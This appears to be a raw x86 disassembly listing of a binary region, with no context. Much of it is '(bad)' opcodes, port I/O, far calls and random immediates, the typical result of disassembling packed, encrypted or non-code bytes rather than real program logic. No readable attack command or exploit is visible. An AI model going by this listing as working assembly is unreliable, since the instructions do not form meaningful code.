  4181f8:	shl    ah,cl
  4181fa:	cdq    
  4181fb:	icebp  
  4181fc:	and    DWORD PTR [ebx+ebx*1+0x56],esi
  418200:	cmp    eax,0x8b9a1c46
  418205:	cmp    bl,BYTE PTR [edx]
  418207:	cmp    BYTE PTR [edx-0x82bcfd0],0x0
  41820e:	int    0xc5
  418210:	test   cl,dh
  418212:	rcr    dl,0x5e
  418215:	outs   dx,BYTE PTR ds:[esi]
  418216:	pushf  
  418217:	mov    esi,0x50a85c4d
  41821c:	sar    al,0x46
  41821f:	rcr    esp,cl
  418221:	push   0xffffffda
  418223:	adc    BYTE PTR ds:0x39c4a85b,0x38
  41822a:	popf   
  41822b:	out    dx,al
  41822c:	mov    fs,WORD PTR [esi-0x6f]
  41822f:	call   0x8acd:0x967c7ad4
  418236:	push   ebp
  418237:	ins    BYTE PTR es:[edi],dx
  418238:	push   0x0
  41823a:	sbb    al,0x82
  41823c:	inc    ebx
  41823d:	and    dl,BYTE PTR [edx+0x49]
  418240:	sbb    cl,BYTE PTR [edx+eax*2-0x93bad7b]
  418247:	xor    al,0xf8
  418249:	rcr    al,0x61
  41824c:	frstor [esi]
  41824e:	sbb    al,0x13
  418250:	call   0xf6a2:0x1dc9901e
  418257:	dec    eax
  418258:	mov    bh,BYTE PTR [ebx+0x1]
  41825b:	lods   al,BYTE PTR ds:[esi]
  41825c:	or     DWORD PTR [edx+0x1568c972],edx
  418262:	adc    bx,WORD PTR [eax]
  418265:	call   0xe8c2:0x1441583f
  41826c:	test   al,0xf4
  41826e:	in     al,dx
  41826f:	ficomp WORD PTR [esi-0x7cae3cea]
  418275:	add    BYTE PTR [ebx+0x6d],bh
  418278:	or     esp,DWORD PTR [ecx+0x1c]
  41827b:	into   
  41827c:	mov    ds:0x889144f8,al
  418281:	inc    esp
  418282:	push   eax
  418283:	mov    ?,WORD PTR [esp+edx*1-0x7e]
  418287:	or     edx,DWORD PTR [ecx]
  418289:	xchg   ebp,eax
  41828a:	inc    esp
  41828b:	mov    cl,0x5e
  41828d:	sbb    ch,BYTE PTR [esi-0x5675db88]
  418293:	dec    esi
  418294:	sbb    cl,ch
  418296:	or     al,0xd6
  418298:	xchg   BYTE PTR [edi],ah
  41829a:	mov    ds:0x144e59,eax
  41829f:	xor    al,0xaa
  4182a1:	(bad)  
  4182a2:	push   ds
  4182a3:	push   es
  4182a4:	rcr    bl,cl
  4182a6:	iret   
  4182a7:	add    BYTE PTR [esi-0x41f3ad56],dh
  4182ad:	and    ecx,esp
  4182af:	add    esp,eax
  4182b1:	mov    al,0xb5
  4182b3:	jmp    0x2c40:0xb61d0dce
  4182ba:	mov    bh,BYTE PTR [esi+0xe]
  4182bd:	call   0xb2a8:0xb75c97de
  4182c4:	sbb    eax,0x2a19c415
  4182c9:	sub    al,0x43
  4182cb:	or     ah,ah
  4182cd:	outs   dx,BYTE PTR ds:[esi]
  4182ce:	adc    al,0xae
  4182d0:	dec    ebp
  4182d1:	sub    al,0xd2
  4182d3:	arpl   WORD PTR [esp+edx*1+0x20940082],si
  4182da:	or     al,0x62
  4182dc:	shr    BYTE PTR [eax+0x4a],0x58
  4182e0:	imul   esi,DWORD PTR [esi-0x11],0x64
  4182e4:	and    eax,0xf7884e5e
  4182e9:	or     edx,ebp
  4182eb:	sbb    BYTE PTR [ebx+0x30b778cc],0x73
  4182f2:	fmul   DWORD PTR [ebx+0x1c]
  4182f5:	dec    eax
  4182f6:	daa    
  4182f7:	cli    
  4182f8:	sub    ah,BYTE PTR [esi+0x10]
  4182fb:	pop    ds
  4182fc:	sub    DWORD PTR [ebx+ebx*4-0x3e],edx
  418300:	pop    eax
  418301:	in     al,0xea
  418303:	or     BYTE PTR [edx+0x1a64a122],al
  418309:	pop    esi
  41830a:	adc    al,0x84
  41830c:	mov    ds:0xc41f8493,al
  418311:	(bad)  
  418312:	das    
  418313:	push   esp
  418314:	cmp    al,0xb4
  418316:	cwde   
  418317:	test   DWORD PTR [ecx+0x50],edx
  41831a:	(bad)  
  41831b:	iret   
  41831c:	pushf  
  41831d:	xchg   edx,eax
  41831e:	mov    eax,0x50e6ab0a
  418323:	inc    ecx
  418324:	mov    esp,0x6a3cee66
  418329:	cs scas al,BYTE PTR es:[edi]
  41832b:	add    eax,0x40150006
  418330:	dec    esi
  418331:	into   
  418332:	push   ds
  418333:	xor    al,bh
  418335:	add    DWORD PTR [eax+esi*4-0x23],ebp
  418339:	(bad)  
  41833a:	in     al,dx
  41833b:	xor    eax,0x47d3c206
  418340:	mov    al,ds:0xccc01da0
  418345:	inc    ebx
  418346:	and    bl,BYTE PTR [eax+ebx*8+0x2ab55472]
  41834d:	mov    al,ds:0x1ac2c1ea
  418352:	sbb    al,0xa5
  418354:	mov    dh,BYTE PTR [esi+0x5469bfd4]
  41835a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41835b:	ror    dl,1
  41835d:	xchg   ebp,eax
  41835e:	ins    DWORD PTR es:[edi],dx
  41835f:	add    BYTE PTR [ebp+eax*1+0x63],cl
  418363:	ror    DWORD PTR ds:0xd40023e2,1
  418369:	push   esi
  41836a:	push   0x103c16a4
  41836f:	clc    
  418370:	mov    dh,0x89
  418372:	(bad)  
  418373:	lock lods al,BYTE PTR ds:[esi]
  418375:	mov    BYTE PTR [ebp*4+0x1ad0d609],0xce
  41837d:	mov    cs,WORD PTR [esp+eax*1-0xe]
  418381:	dec    eax
  418382:	loop   0x4183f4
  418384:	lods   al,BYTE PTR ds:[esi]
  418385:	pop    ebp
  418386:	inc    edx
  418387:	push   0x120d8b2c
  41838c:	jle    0x418336
  41838e:	adc    eax,0x7c0e9358
  418393:	pop    eax
  418394:	jmp    0xb135:0xd4bdd6d6
  41839b:	mov    al,ds:0x3d0c85a4
  4183a0:	xchg   edx,eax
  4183a1:	(bad)  
  4183a2:	data16 mov fs,WORD PTR [esi+0x20]
  4183a6:	in     al,0x70
  4183a8:	jp     0x4183fc
  4183aa:	adc    DWORD PTR [esi-0x55753da6],0x30
  4183b1:	pushf  
  4183b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183b3:	fs adc eax,0x159a2a7f
  4183b9:	jmp    0x418353
  4183bb:	push   edx
  4183bc:	push   esp
  4183bd:	stos   BYTE PTR es:[edi],al
  4183be:	inc    esi
  4183bf:	fdivr  st(7),st
  4183c1:	jo     0x418438
  4183c3:	pop    ecx
  4183c4:	ret    0xa066
  4183c7:	retf   0x385e
  4183ca:	add    DWORD PTR [ebp+0x5],edx
  4183cd:	sub    ch,0xba
  4183d0:	fidiv  DWORD PTR [ebx+eax*1]
  4183d3:	push   esi
  4183d4:	mov    dh,al
  4183d6:	imul   ebp,DWORD PTR [eax+0x102842b],0x5
  4183dd:	or     al,0xb1
  4183df:	mov    esp,0xc569279e
  4183e4:	adc    DWORD PTR [eax+0x3d8dca05],edi
  4183ea:	call   0xa598393c
  4183ef:	call   0x8f887ca8
  4183f4:	jl     0x418422
  4183f6:	xchg   esi,eax
  4183f7:	pop    ecx
  4183f8:	aad    0xf4
  4183fa:	xchg   edx,eax
  4183fb:	inc    edi
  4183fc:	push   ss
  4183fd:	xlat   BYTE PTR ds:[ebx]
  4183fe:	adc    bh,BYTE PTR [ebp-0x2f2972a7]
  418404:	push   esp
  418405:	cs (bad) 
  418407:	sti    
  418408:	outs   dx,BYTE PTR ds:[esi]
  418409:	imul   esp,DWORD PTR [edx],0xea6d9ee
  41840f:	add    eax,0xb8cbea7a
  418414:	retf   0x2e26
  418417:	and    al,0xb4
  418419:	dec    eax
  41841a:	and    DWORD PTR [edx],esp
  41841c:	fimul  DWORD PTR [ebx-0x36]
  41841f:	aas    
  418420:	or     eax,0x1a3438ac
  418425:	push   edx
  418426:	stc    
  418427:	fcomp  DWORD PTR [edx*1-0x25ef8dd5]
  41842e:	popa   
  41842f:	loop   0x4183eb
  418431:	push   ss
  418432:	or     BYTE PTR [esi-0x6],0x48
  418436:	mov    al,ds:0x76be18a9
  41843b:	call   0x40bbffa7
  418440:	ins    BYTE PTR es:[edi],dx
  418441:	setle  BYTE PTR [esi+edi*4]
  418445:	rcr    BYTE PTR [esi+0x78],0x94
  418449:	mov    ecx,0x90c691a3
  41844e:	jb     0x41847e
  418450:	dec    esp
  418451:	int    0x6c
  418453:	rol    BYTE PTR ds:0x9dbe32b0,0xe6
  41845a:	adc    eax,0x62a7892f
  41845f:	ins    BYTE PTR es:[edi],dx
  418460:	push   esi
  418461:	mov    al,ds:0xa2cc0003
  418466:	arpl   WORD PTR [ebx+0x1a],si
  418469:	inc    ebp
  41846a:	jp     0x418457
  41846c:	sbb    BYTE PTR [esi-0x70ba6d46],cl
  418472:	jp     0x4184d9
  418474:	scas   al,BYTE PTR es:[edi]
  418475:	stos   DWORD PTR es:[edi],eax
  418476:	daa    
  418477:	or     al,0x91
  418479:	je     0x4184e3
  41847b:	xchg   BYTE PTR [eax],cl
  41847d:	add    eax,0xd2fb9e0d
  418482:	or     ah,BYTE PTR [esi-0x5f]
  418485:	bound  eax,QWORD PTR [ecx+0x54425891]
  41848b:	je     0x418503
  41848d:	mov    ebp,0xd78905c
  418492:	pop    edx
  418493:	xchg   ebx,eax
  418494:	pushf  
  418495:	xor    BYTE PTR [ebp+0x15a3a30e],dh
  41849b:	cmp    al,0x87
  41849d:	fs pop edx
  41849f:	fisubr WORD PTR [esi+0x8]
  4184a2:	xor    al,0x3
  4184a4:	jo     0x4184a7
  4184a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184a7:	(bad)  
  4184a9:	dec    esp
  4184aa:	sbb    edi,DWORD PTR [esi]
  4184ac:	inc    esp
  4184ad:	not    bl
  4184af:	outs   dx,BYTE PTR ds:[esi]
  4184b0:	dec    esi
  4184b1:	repnz sbb al,0xb6
  4184b4:	sub    al,BYTE PTR es:[eax-0xb31c37e]
  4184bb:	retf   
  4184bc:	mov    cs,WORD PTR [esi-0x6d]
  4184bf:	mov    es,WORD PTR ds:0xda888047
  4184c5:	cld    
  4184c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c7:	xlat   BYTE PTR ds:[ebx]
  4184c8:	push   es
  4184c9:	imul   ebx,DWORD PTR [edi+0x77341580],0xffffffb7
  4184d0:	push   ds
  4184d1:	inc    ebx
  4184d2:	int    0x58
  4184d4:	sub    DWORD PTR [edx+eiz*1+0x160aa2d1],edx
  4184db:	jno    0x418527
  4184dd:	pop    ss
  4184de:	pop    es
  4184df:	ds push eax
  4184e1:	test   DWORD PTR [esi+ecx*8],esi
  4184e4:	aam    0x20
  4184e6:	pop    edi
  4184e7:	inc    eax
  4184e8:	loopne 0x418539
  4184ea:	xchg   esp,eax
  4184eb:	push   edx
  4184ec:	mov    ah,0x8a
  4184ee:	shl    edx,0x17
  4184f1:	les    ebp,FWORD PTR ds:0x1045ec9a
  4184f7:	add    al,0xd8
  4184f9:	shr    ah,1
  4184fb:	into   
  4184fc:	jbe    0x4184ce
  4184fe:	lds    eax,FWORD PTR [edi]
  418500:	aam    0x27
  418502:	sbb    BYTE PTR [esi-0x52],al
  418505:	mov    ds:0x466ccaa4,al
  41850a:	or     DWORD PTR [ebp+0x1a],eax
  41850d:	imul   ecx,edx,0xffffffbe
  418510:	in     al,0xe1
  418512:	mov    ah,0x57
  418514:	shr    BYTE PTR [ebx],cl
  418516:	and    bl,dh
  418518:	ret    
  418519:	push   esp
  41851a:	sbb    bh,BYTE PTR [ecx-0x48]
  41851d:	stc    
  41851e:	add    DWORD PTR [edx],ecx
  418520:	mov    cs,WORD PTR [eax]
  418522:	test   BYTE PTR [edi],0xcc
  418525:	test   eax,0x2a42e37c
  41852a:	xor    al,BYTE PTR [eax-0x18597520]
  418530:	mov    ds:0x7609c3b5,eax
  418535:	pop    edx
  418536:	sbb    eax,0x13f3afe
  41853b:	pusha  
  41853c:	xlat   BYTE PTR ds:[ebx]
  41853d:	mov    ch,0x7a
  41853f:	mov    WORD PTR [eax],ds
  418541:	test   ch,0x65
  418544:	cmp    al,0x0
  418546:	ds inc ecx
  418548:	loopne 0x418577
  41854a:	int3   
  41854b:	sub    al,0x57
  41854d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41854e:	mov    ch,0x50
  418550:	jo     0x418597
  418552:	add    BYTE PTR [edx+0x36],al
  418555:	stos   BYTE PTR es:[edi],al
  418556:	cwde   
  418557:	push   0x3b
  418559:	adc    al,0x36
  41855b:	mov    al,ds:0xd51a05c5
  418560:	mov    es,WORD PTR [esi-0x2e]
  418563:	adc    eax,0x4a5a1015
  418568:	data16 loopne 0x4185bb
  41856b:	jns    0x418515
  41856d:	push   esi
  41856e:	adc    al,0xbc
  418570:	or     al,bh
  418572:	test   al,0x0
  418574:	jge    0x41854e
  418576:	fcmove st,st(2)
  418578:	lock scas al,BYTE PTR es:[edi]
  41857a:	xor    BYTE PTR [ecx+0x68421006],al
  418580:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  418582:	js     0x4185ac
  418584:	loopne 0x418509
  418586:	aam    0xdb
  418588:	in     al,dx
  418589:	nop
  41858a:	pop    ebp
  41858b:	xchg   BYTE PTR [eax],dh
  41858d:	cmp    bh,BYTE PTR [esi]
  41858f:	add    ebp,DWORD PTR [eax+0x42]
  418592:	jge    0x418536
  418594:	mov    al,ds:0x474d881e
  418599:	clc    
  41859a:	mov    al,0x46
  41859c:	jno    0x41852f
  41859e:	adc    al,0xbb
  4185a0:	rcl    DWORD PTR [eax-0x5c],1
  4185a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185a4:	pushf  
  4185a5:	xchg   BYTE PTR [ebp+0x3618cf02],bh
  4185ab:	xchg   ebx,eax
  4185ac:	aad    0x60
  4185ae:	xchg   ecx,eax
  4185af:	fdiv   QWORD PTR es:[edi-0x5f5f5b65]
  4185b6:	pop    ebp
  4185b7:	inc    esp
  4185b8:	adc    al,0xe4
  4185ba:	add    al,bl
  4185bc:	mov    esi,0x149b06d8
  4185c1:	mov    ah,0x45
  4185c3:	outs   dx,BYTE PTR ds:[esi]
  4185c4:	cmp    BYTE PTR [esi],0x43
  4185c7:	jmp    0x5b1d:0x987267f4
  4185ce:	scas   eax,DWORD PTR es:[edi]
  4185cf:	sub    al,0x50
  4185d1:	lea    edi,[eax+ebp*1]
  4185d4:	mov    ch,0x8c
  4185d6:	adc    DWORD PTR cs:[esi+0x762675a6],esi
  4185dd:	outs   dx,BYTE PTR ds:[esi]
  4185de:	(bad)  
  4185df:	sbb    DWORD PTR [ebx-0x39af5c60],edi
  4185e5:	mov    WORD PTR [ebx+0x1b],ds
  4185e8:	fbld   TBYTE PTR [esi+ebx*1]
  4185eb:	mov    ss,ebx
  4185ed:	or     al,0x9e
  4185ef:	icebp  
  4185f0:	push   0xffffffa8
  4185f2:	mov    al,0x62
  4185f4:	neg    BYTE PTR [ecx]
  4185f6:	or     bh,dl
  4185f8:	fadd   QWORD PTR [eax-0x652925e3]
  4185fe:	rcr    BYTE PTR [esi+esi*2-0x41df9b36],cl
  418605:	push   ebx
  418606:	pop    eax
  418607:	and    bh,0x9a
  41860a:	imul   ebp,DWORD PTR [ebx-0x2a],0x34
  41860e:	repz loop 0x4185cf
  418611:	les    ebp,FWORD PTR [esi]
  418613:	push   ebp
  418614:	bound  ecx,QWORD PTR [eax]
  418616:	add    BYTE PTR [ecx+ebx*4-0x28],0xa
  41861b:	sbb    bh,BYTE PTR [eax]
  41861d:	push   0x54
  41861f:	sbb    bh,BYTE PTR [edx]
  418621:	push   cs
  418622:	push   ecx
  418623:	xlat   BYTE PTR ds:[ebx]
  418624:	adc    al,0x16
  418626:	sbb    al,0x24
  418628:	sub    edi,esp
  41862a:	xchg   ebx,eax
  41862b:	cli    
  41862c:	mov    dl,0xd9
  41862e:	imul   BYTE PTR [ebp+eax*2+0x215c20d]
  418635:	pop    ss
  418636:	push   esp
  418637:	and    BYTE PTR [eax+eiz*4-0x3b67165f],bl
  41863e:	or     ch,cl
  418640:	into   
  418641:	jno    0x41864d
  418643:	jae    0x418697
  418645:	fsub   DWORD PTR [ebp-0x5cf4974f]
  41864b:	jo     0x418666
  41864d:	fdiv   QWORD PTR [eax]
  41864f:	xchg   DWORD PTR [esi+0x5b],eax
  418652:	and    al,0xf2
  418654:	jp     0x4185d8
  418656:	jg     0x4185e0
  418658:	mov    WORD PTR [eax+0x159603],gs
  41865e:	xchg   BYTE PTR [eax],ch
  418660:	out    0xe6,al
  418662:	aad    0x4
  418664:	mov    ch,0xd4
  418666:	xor    ah,al
  418668:	out    dx,al
  418669:	add    al,0x58
  41866b:	dec    eax
  41866c:	and    BYTE PTR [eax],ch
  41866e:	add    al,0xda
  418670:	sbb    al,0xea
  418672:	and    DWORD PTR [eax-0x29b5bb53],esp
  418678:	jbe    0x418600
  41867a:	(bad)  
  41867b:	stc    
  41867c:	retf   
  41867d:	lock xchg edx,eax
  41867f:	shl    BYTE PTR [ebx],1
  418681:	mov    esi,0x56923277
  418686:	inc    esp
  418687:	mov    al,ds:0x9c5e069f
  41868c:	adc    BYTE PTR [eax],al
  41868e:	inc    eax
  41868f:	loope  0x4186bf
  418691:	ret    
  418692:	mov    dl,0xf8
  418694:	inc    esp
  418695:	loope  0x4186cc
  418697:	mov    ah,0x4e
  418699:	lahf   
  41869a:	mov    dl,0xed
  41869c:	scas   eax,DWORD PTR es:[edi]
  41869d:	mov    dh,0x36
  41869f:	mov    bh,0x25
  4186a1:	sar    BYTE PTR [edx+edi*1-0x59],0x48
  4186a6:	cmp    eax,DWORD PTR [ebx+ebx*1]
  4186a9:	cmp    al,0xe8
  4186ab:	pop    eax
  4186ac:	jle    0x4186d3
  4186ae:	sub    al,0xd4
  4186b0:	ss js  0x4186f4
  4186b3:	rol    DWORD PTR [eax],cl
  4186b5:	rcl    BYTE PTR [ecx+0x60],1
  4186b8:	pop    eax
  4186b9:	or     al,0xc
  4186bb:	mov    BYTE PTR [esi],0x69
  4186be:	pop    ebp
  4186bf:	inc    ebx
  4186c0:	call   0x3d082519
  4186c5:	sub    BYTE PTR [eax],bh
  4186c7:	adc    al,0xd0
  4186c9:	adc    al,0x82
  4186cb:	push   ds
  4186cc:	mov    edx,0xaeabf64e
  4186d1:	sub    DWORD PTR [esi+esi*8],ebp
  4186d4:	push   ss
  4186d5:	cld    
  4186d6:	hlt    
  4186d7:	stos   BYTE PTR es:[edi],al
  4186d8:	cld    
  4186d9:	loope  0x4186b5
  4186db:	push   ecx
  4186dc:	add    al,0xe1
  4186de:	pop    ebx
  4186df:	and    al,0x2f
  4186e1:	dec    esp
  4186e2:	dec    eax
  4186e3:	push   0xf895fa68
  4186e8:	pushf  
  4186e9:	jb     0x4186eb
  4186eb:	je     0x418769
  4186ed:	ret    0xfe0
  4186f0:	push   ds
  4186f1:	pusha  
  4186f2:	xor    al,0x4a
  4186f4:	xchg   esp,eax
  4186f5:	(bad)  
  4186f6:	pop    esp
  4186f7:	sub    BYTE PTR [edx-0x45],0x1a
  4186fb:	stos   BYTE PTR es:[edi],al
  4186fc:	test   al,0xa8
  4186fe:	cwde   
  4186ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418700:	sahf   
  418701:	or     edi,edx
  418703:	push   0x10
  418705:	mov    dh,0xc1
  418707:	ror    BYTE PTR [edx-0xbf40750],0x22
  41870e:	sub    bl,BYTE PTR [edx-0x6b]
  418711:	ins    DWORD PTR es:[edi],dx
  418712:	mov    BYTE PTR [edx],bh
  418714:	or     edx,DWORD PTR [edx-0x5e]
  418717:	adc    eax,0x377c067c
  41871c:	inc    ecx
  41871d:	mov    ebx,0x9b9ebb0c
  418722:	and    bh,dh
  418724:	and    BYTE PTR [ebp+0x34380146],bh
  41872a:	jle    0x4186e0
  41872c:	or     DWORD PTR [edx],esi
  41872e:	pop    edx
  41872f:	mov    esp,0x50105415
  418734:	adc    cl,BYTE PTR [edx-0x57]
  418737:	cld    
  418738:	cmp    al,0x31
  41873a:	add    al,0x7b
  41873c:	sub    eax,0xcab247d6
  418741:	sub    BYTE PTR [eax-0x4a],0x59
  418745:	push   ebx
  418746:	fmul   QWORD PTR [esi-0xb05e906]
  41874c:	retf   0xa67c
  41874f:	jecxz  0x41877e
  418751:	ins    DWORD PTR es:[edi],dx
  418752:	push   0xbcc0ec68
  418757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418758:	repnz lock test BYTE PTR [ecx+0x70616858],dl
  418760:	sub    bh,bl
  418762:	mov    edx,0x3ecd8215
  418767:	cmp    al,0x1b
  418769:	sbb    eax,0x432df434
  41876e:	scas   al,BYTE PTR es:[edi]
  41876f:	pop    eax
  418770:	test   DWORD PTR [edx+0x2a124e5a],0x815a0b8e
  41877a:	or     DWORD PTR [edx+0x78],ebx
  41877d:	xor    al,0x10
  41877f:	adc    esi,eax
  418781:	loopne 0x418785
  418783:	pop    ss
  418784:	ss mov ah,0x66
  418787:	push   0x10
  418789:	stos   DWORD PTR es:[edi],eax
  41878a:	mov    esi,0xdb9f02f7
  41878f:	dec    eax
  418790:	pop    ebp
  418791:	pop    ebx
  418792:	push   ebp
  418793:	rcl    DWORD PTR [esi+0x5e],cl
  418796:	test   eax,0xd69a6d18
  41879b:	aas    
  41879c:	push   eax
  41879d:	inc    edi
  41879e:	and    DWORD PTR [ecx-0x60],0xdaaa1c60
  4187a5:	cmp    eax,0x8606c150
  4187aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187ab:	ins    BYTE PTR es:[edi],dx
  4187ac:	ss pop edi
  4187ae:	sbb    BYTE PTR [ebx+0x45],al
  4187b1:	mov    dl,bh
  4187b3:	mov    fs:0x2fc262ac,al
  4187b9:	femms  
  4187bb:	stos   DWORD PTR es:[edi],eax
  4187bc:	mov    ebp,0x1e042ee0
  4187c1:	cmp    al,0x35
  4187c3:	add    BYTE PTR [eax],bl
  4187c5:	mov    eax,0xa3b5dc1b
  4187ca:	outs   dx,DWORD PTR ds:[esi]
  4187cb:	mov    ah,0x2a
  4187cd:	jo     0x418821
  4187cf:	push   0x1b
  4187d1:	cwde   
  4187d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187d3:	mov    dl,0xef
  4187d5:	and    BYTE PTR [edi+0x6a],0x91
  4187d9:	les    edi,FWORD PTR [esi]
  4187db:	lods   al,BYTE PTR ds:[esi]
  4187dc:	out    dx,eax
  4187dd:	add    BYTE PTR [esi+eax*1],0xa2
  4187e1:	mov    dh,0x1
  4187e3:	mov    dh,0x38
  4187e5:	jl     0x418797
  4187e7:	vpaddusb ymm5,ymm1,YMMWORD PTR [esi-0x6]
  4187ec:	shl    DWORD PTR [esi+0x830c850],1
  4187f2:	dec    eax
  4187f3:	xchg   esi,eax
  4187f4:	cmp    al,BYTE PTR [ebx+ebx*4]
  4187f7:	lods   eax,DWORD PTR ds:[esi]
  4187f8:	xchg   esp,eax
  4187f9:	repnz test BYTE PTR [esp+edx*4-0x79],0xbb
  4187ff:	ror    BYTE PTR [esi+0x14],0xb0
  418803:	stos   DWORD PTR es:[edi],eax
  418804:	xor    eax,0x2f34d0db
  418809:	retf   0x549a
  41880c:	push   ss
  41880d:	test   eax,0x5dd2526e
  418812:	add    al,0x2a
  418814:	push   ds
  418815:	sbb    dh,al
  418817:	pop    esi
  418818:	push   0x3c
  41881a:	call   0x36910a4
  41881f:	inc    eax
  418820:	test   al,0xfa
  418822:	test   al,0xe2
  418824:	or     BYTE PTR [eax+0x55],al
  418827:	repnz push 0x5053a4e8
  41882d:	push   0xd4b8da6a
  418832:	fsub   QWORD PTR [edx]
  418834:	rol    DWORD PTR [ebx],0x18
  418837:	pop    ebx
  418838:	or     BYTE PTR [edx-0x5c],dl
  41883b:	les    ebp,FWORD PTR [esi-0x735785d9]
  418841:	push   edi
  418842:	les    eax,FWORD PTR [esi]
  418844:	xor    bl,BYTE PTR [ebp+0x4b]
  418847:	mov    edx,0x2c568731
  41884c:	add    DWORD PTR [ecx-0x30],esi
  41884f:	mov    DWORD PTR [esi],0x6a108b84
  418855:	sub    ch,BYTE PTR [eax+0x4d]
  418858:	pop    esi
  418859:	jns    0x418819
  41885b:	add    eax,0x652eb284
  418860:	xchg   edi,eax
  418861:	ret    0x2c67
  418864:	xchg   edx,eax
  418865:	lock and ch,BYTE PTR [edx]
  418868:	or     al,0xce
  41886a:	jmp    0xdaa5:0x2e02d415
  418871:	repnz mov al,ds:0x56381930
  418877:	pop    es
  418878:	pop    eax
  418879:	push   es
  41887a:	scas   al,BYTE PTR es:[edi]
  41887b:	rcr    BYTE PTR [edx],cl
  41887d:	or     edi,DWORD PTR [ebx]
  41887f:	lods   al,BYTE PTR ds:[esi]
  418880:	xchg   esp,eax
  418881:	pop    ecx
  418882:	sbb    al,0xd8
  418884:	test   eax,0x15e8ee5e
  418889:	mov    ch,0x1
  41888b:	xor    ax,0x5c18
  41888f:	pop    ebx
  418890:	adc    ah,BYTE PTR [esp+edx*2]
  418893:	je     0x41889a
  418895:	push   eax
  418896:	ret    
  418897:	xor    dl,BYTE PTR [edx+0x6116a583]
  41889d:	sbb    BYTE PTR [edx+0x36],dl
  4188a0:	mov    ds:0x574122b5,eax
  4188a5:	pusha  
  4188a6:	or     dh,al
  4188a8:	mov    esi,0x98db2887
  4188ad:	sar    BYTE PTR [edx+ebp*4+0x1d9cef60],1
  4188b4:	call   0x86fbfb9
  4188b9:	mov    esp,0xb60c5112
  4188be:	push   esp
  4188bf:	data16 sbb BYTE PTR [ecx+0x18],0xda
  4188c4:	jno    0x418926
  4188c6:	fimul  DWORD PTR [ebp+0x5a]
  4188c9:	inc    edi
  4188ca:	sbb    al,0x2
  4188cc:	cmp    cl,BYTE PTR [ecx]
  4188ce:	pop    ebp
  4188cf:	mov    cl,BYTE PTR [edi-0x54]
  4188d2:	stos   DWORD PTR es:[edi],eax
  4188d3:	jmp    0x4188f7
  4188d5:	add    edi,ecx
  4188d7:	adc    bh,cl
  4188d9:	add    al,0x99
  4188db:	add    BYTE PTR [ecx-0x4ffe1e7f],cl
  4188e1:	xchg   edx,eax
  4188e2:	sub    BYTE PTR [esi],dh
  4188e4:	(bad)  
  4188e5:	retf   
  4188e6:	inc    edx
  4188e7:	cmp    ah,bh
  4188e9:	mov    esi,0xd0ce6223
  4188ef:	push   cs
  4188f0:	cwde   
  4188f1:	jmp    0x45e72a10
  4188f6:	push   cs
  4188f7:	inc    edx
  4188f8:	cld    
  4188f9:	push   cs
  4188fa:	fsub   st,st(4)
  4188fc:	shl    BYTE PTR [eax-0x7c],1
  4188ff:	mov    ?,WORD PTR [esi]
  418901:	mov    eax,0x352a806a
  418906:	add    esp,DWORD PTR [ecx]
  418908:	and    dl,0x14
  41890b:	lods   al,BYTE PTR ds:[esi]
  41890c:	dec    edx
  41890d:	das    
  41890e:	test   ch,cl
  418910:	mov    ch,0x4
  418912:	pop    eax
  418913:	fcomip st,st(2)
  418915:	xchg   esp,eax
  418916:	push   esp
  418917:	outs   dx,BYTE PTR ds:[esi]
  418918:	clc    
  418919:	(bad)  
  41891a:	std    
  41891b:	shl    BYTE PTR [edx+0x488e6556],1
  418921:	jae    0x4188ed
  418923:	pop    ebx
  418924:	push   esi
  418925:	mov    ah,0xd8
  418927:	xor    eax,0xfa576a02
  41892c:	popa   
  41892d:	mov    dl,0x4d
  41892f:	cwde   
  418930:	pop    esp
  418931:	jl     0x41898b
  418933:	clc    
  418934:	imul   esi,DWORD PTR [esi-0x751320d8],0x56829745
  41893e:	cmp    dh,BYTE PTR [ecx-0x131469ee]
  418944:	push   edx
  418945:	mov    al,0x45
  418947:	push   cs
  418948:	add    esp,DWORD PTR [eax+0x6e]
  41894b:	xchg   ebx,eax
  41894c:	cmp    DWORD PTR [edx+ebp*4+0x68],0x10
  418951:	fdivr  DWORD PTR [eax+eiz*1]
  418954:	mov    dl,0xa
  418956:	stos   BYTE PTR es:[edi],al
  418957:	add    eax,0x202a0074
  41895c:	rcl    esp,0xdd
  41895f:	adc    al,0x2a
  418962:	ds (bad) 
  418964:	cmp    DWORD PTR [ebx+ecx*2-0x66],edi
  418968:	test   eax,0x6680a747
  41896d:	ss jl  0x4189b0
  418970:	sub    al,BYTE PTR [ecx]
  418972:	cmp    al,0x86
  418974:	pop    ds
  418975:	add    BYTE PTR [esi],dh
  418977:	mov    esi,0x80ae0cfd
  41897c:	pop    ds
  41897d:	xchg   BYTE PTR ds:0x58a0d84,al
  418983:	call   0x5bd0:0x84294cf8
  41898a:	mov    ch,0x89
  41898c:	pop    esp
  41898d:	push   esi
  41898e:	sub    BYTE PTR [eax+edx*4],cl
  418991:	add    BYTE PTR [esi-0x5efedb58],ch
  418997:	inc    esi
  418998:	ficom  WORD PTR [eax+0x44a8560a]
  41899e:	and    al,0xe2
  4189a0:	jnp    0x418997
  4189a2:	in     al,0x37
  4189a4:	cmp    eax,0x960ad082
  4189a9:	push   cs
  4189aa:	cs fcmovnbe st,st(0)
  4189ad:	sahf   
  4189ae:	xchg   ecx,eax
  4189af:	sbb    eax,0x52358754
  4189b4:	mov    eax,ds:0xe4f0616
  4189b9:	pop    ebx
  4189ba:	xchg   esi,eax
  4189bb:	cmp    dl,BYTE PTR [eax+0x60]
  4189be:	inc    eax
  4189bf:	ret    0x94cf
  4189c2:	iret   
  4189c3:	js     0x418a0d
  4189c5:	popa   
  4189c6:	mov    ebx,0x246a9e88
  4189cb:	jne    0x418a13
  4189cd:	xor    al,0xde
  4189cf:	dec    ebp
  4189d0:	add    DWORD PTR [ebp+0x26e410a0],esp
  4189d6:	mov    esi,0xe8ad482
  4189db:	and    dh,0x80
  4189de:	adc    al,0xc2
  4189e0:	pushf  
  4189e1:	inc    esi
